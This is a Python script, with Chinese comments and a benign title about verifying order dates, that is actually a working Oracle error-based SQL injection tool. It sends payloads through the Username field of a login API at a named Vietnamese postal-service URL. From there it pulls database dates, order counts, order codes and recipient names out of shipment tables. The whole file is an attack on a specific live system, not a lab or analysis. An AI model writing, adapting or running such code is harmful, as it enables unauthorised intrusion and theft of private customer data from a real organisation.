#!/usr/bin/env python3
"""
验证订单日期是否是当天
"""

import requests
import json
import time

class DateVerifier:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def verify_date(self):
        """验证日期信息"""
        print("=" * 80)
        print("📅 日期验证工具")
        print("=" * 80)
        
        queries = [
            ("数据库当前时间", 
             "SELECT TO_CHAR(SYSDATE,'YYYY-MM-DD HH24:MI:SS') FROM DUAL"),
            
            ("数据库当前日期(YYYYMMDD)", 
             "SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL"),
            
            ("E1E2_PH表最新日期", 
             "SELECT MAX(NGAY) FROM EMS.E1E2_PH"),
            
            ("E1E2_PH表最早日期", 
             "SELECT MIN(NGAY) FROM EMS.E1E2_PH"),
            
            ("SHIPMENT表最新日期", 
             "SELECT MAX(CREATE_DATE) FROM EMS.SHIPMENT"),
            
            ("E1E2_PH_TEMP_DATA2_LOG表最新日期", 
             "SELECT MAX(NGAY) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY IS NOT NULL"),
        ]
        
        results = {}
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            print(f"   SQL: {query}")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ 结果: {result}")
                results[name] = result
            else:
                print(f"   ❌ 查询失败")
            time.sleep(1.5)
        
        return results
    
    def check_recent_days(self):
        """检查最近几天的订单数量"""
        print("\n" + "=" * 80)
        print("📊 最近几天的订单数量对比")
        print("=" * 80)
        
        # 检查最近5天
        dates = ['20251006', '20251007', '20251008', '20251009', '20251010']
        
        for date in dates:
            print(f"\n📅 日期: {date}")
            
            # E1E2_PH表
            query1 = f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"
            count1 = self.extract_via_error(query1)
            if count1:
                print(f"   E1E2_PH表: {count1} 条")
            
            # SHIPMENT表
            query2 = f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"
            count2 = self.extract_via_error(query2)
            if count2:
                print(f"   SHIPMENT表: {count2} 条")
            
            time.sleep(2)
    
    def check_today_order_details(self):
        """检查今天订单的详细信息"""
        print("\n" + "=" * 80)
        print("🔍 20251010订单详细验证")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总订单数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("不同MABC数", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("最小MABC", 
             f"SELECT MIN(MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("最大MABC", 
             f"SELECT MAX(MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("第一条记录的创建时间(如果有)", 
             f"SELECT TO_CHAR(DATE_LOG,'YYYY-MM-DD HH24:MI:SS') FROM (SELECT DATE_LOG FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DATE_LOG IS NOT NULL ORDER BY DATE_LOG) WHERE ROWNUM=1"),
            
            ("最后一条记录的创建时间(如果有)", 
             f"SELECT TO_CHAR(MAX(DATE_LOG),'YYYY-MM-DD HH24:MI:SS') FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DATE_LOG IS NOT NULL"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            else:
                print(f"   ❌ 查询失败")
            time.sleep(1.5)
    
    def check_sample_orders(self):
        """检查样本订单的时间戳"""
        print("\n" + "=" * 80)
        print("📋 样本订单时间验证")
        print("=" * 80)
        
        date = '20251010'
        
        # 获取前3个MABC
        print("\n🔎 前3个订单的详细信息:")
        for i in range(1, 4):
            print(f"\n订单 {i}:")
            
            # MABC
            query_mabc = f"SELECT MABC FROM (SELECT DISTINCT MABC, ROWNUM AS RN FROM EMS.E1E2_PH WHERE NGAY='{date}' ORDER BY MABC) WHERE RN={i}"
            mabc = self.extract_via_error(query_mabc)
            if mabc:
                print(f"  MABC: {mabc}")
                
                # 查询这个MABC在SHIPMENT表的创建日期
                query_ship = f"SELECT CREATE_DATE FROM EMS.SHIPMENT WHERE CODE LIKE '%{mabc}%' AND ROWNUM=1"
                ship_date = self.extract_via_error(query_ship)
                if ship_date:
                    print(f"  SHIPMENT表CREATE_DATE: {ship_date}")
                
                # 查询收件人
                query_name = f"SELECT NGUOINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                name = self.extract_via_error(query_name)
                if name:
                    print(f"  收件人: {name}")
                
                time.sleep(2)
    
    def run_all_checks(self):
        """运行所有验证"""
        print("=" * 80)
        print("🔍 订单日期完整验证工具")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行验证
        print("\n" + "=" * 80)
        print("第1步: 验证数据库日期")
        print("=" * 80)
        date_info = self.verify_date()
        
        print("\n" + "=" * 80)
        print("第2步: 检查最近几天订单")
        print("=" * 80)
        self.check_recent_days()
        
        print("\n" + "=" * 80)
        print("第3步: 验证20251010订单详情")
        print("=" * 80)
        self.check_today_order_details()
        
        print("\n" + "=" * 80)
        print("第4步: 检查样本订单")
        print("=" * 80)
        self.check_sample_orders()
        
        # 总结
        print("\n" + "=" * 80)
        print("📊 验证总结")
        print("=" * 80)
        
        db_date = date_info.get("数据库当前日期(YYYYMMDD)", "")
        max_date = date_info.get("E1E2_PH表最新日期", "")
        
        print(f"\n数据库当前日期: {db_date}")
        print(f"E1E2_PH表最新日期: {max_date}")
        
        if db_date == '20251010' and max_date == '20251010':
            print("\n✅ 确认：20251010 就是今天的日期！")
            print("✅ 查询的订单确实是当天（2025-10-10）的订单")
        elif max_date == '20251010':
            print(f"\n⚠️  数据库当前日期是 {db_date}")
            print(f"⚠️  但E1E2_PH表最新日期是 {max_date}")
            print("⚠️  可能存在时区差异或数据同步延迟")
        else:
            print(f"\n❌ 警告：E1E2_PH表最新日期是 {max_date}，不是 20251010")
            print("❌ 可能不是今天的订单！")
        
        print("\n" + "=" * 80)
        print("🎉 验证完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    verifier = DateVerifier(target_url)
    verifier.run_all_checks()
